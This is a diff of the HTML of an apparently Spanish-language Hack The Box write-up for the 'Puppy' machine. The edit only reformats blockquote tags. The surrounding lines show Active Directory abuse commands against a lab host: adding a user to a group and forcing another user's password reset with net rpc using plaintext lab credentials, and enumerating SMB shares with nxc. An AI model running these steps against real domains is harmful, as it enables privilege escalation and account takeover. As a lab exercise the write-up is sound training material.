@@ -449,7 +449,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> levi.james added to DEVELOPERS
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ net rpc group addmem <span style="color:#e6db74">&#34;DEVELOPERS&#34;</span> <span style="color:#e6db74">&#34;levi.james&#34;</span> -U <span style="color:#e6db74">&#34;PUPPY.HTB&#34;</span>/<span style="color:#e6db74">&#34;levi.james&#34;</span>%<span style="color:#e6db74">&#39;KingofAkron2025!&#39;</span> -S <span style="color:#e6db74">&#34;10.10.11.70&#34;</span>
 </span></span></code></pre></div><blockquote>
-<p>Ponemos entre comillas simples la contraseña ya que contiene caracteres especiales como &ldquo;!&rdquo;</p></blockquote>
+<p>Ponemos entre comillas simples la contraseña ya que contiene caracteres especiales como &ldquo;!&rdquo;</p>
+</blockquote>
 <p>Ahora que ya hemos añadido al usuario levi.james vamos a comprobar si tenemos permisos sobre la carpeta compartida DEV con <code>nxc</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nxc smb 10.10.11.70 -u <span style="color:#e6db74">&#39;levi.james&#39;</span> -p <span style="color:#e6db74">&#39;KingofAkron2025!&#39;</span> --shares
 </span></span><span style="display:flex;"><span>SMB 10.10.11.70 <span style="color:#ae81ff">445</span> DC <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PUPPY.HTB<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
@@ -550,7 +551,8 @@
 </span></span><span style="display:flex;"><span>raise KerberosError<span style="color:#f92672">(</span>krb_message<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>minikerberos.protocol.errors.KerberosError: Error Name: KDC_ERR_CLIENT_REVOKED Detail: <span style="color:#e6db74">&#34;Client’s credentials have been revoked&#34;</span>
 </span></span></code></pre></div><blockquote>
-<p>This might be because of an explicit disabling or because of other restrictions in place on the account. For example: account disabled, expired, or locked out.</p></blockquote>
+<p>This might be because of an explicit disabling or because of other restrictions in place on the account. For example: account disabled, expired, or locked out.</p>
+</blockquote>
 <h2 id="force-change-password---net-rpc">Force Change Password - Net rpc<a hidden class="anchor" aria-hidden="true" href="#force-change-password---net-rpc">#</a></h2>
 <p>Cambiamos contraseña usuario adam.silver - Net rpc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ net rpc password <span style="color:#e6db74">&#34;adam.silver&#34;</span> <span style="color:#e6db74">&#39;micontrafavorita2025!&#39;</span> -U <span style="color:#e6db74">&#34;PUPPY.HTB&#34;</span>/<span style="color:#e6db74">&#34;ant.edwards&#34;</span>%<span style="color:#e6db74">&#39;Antman2025!&#39;</span> -S <span style="color:#e6db74">&#34;10.10.11.70&#34;</span>
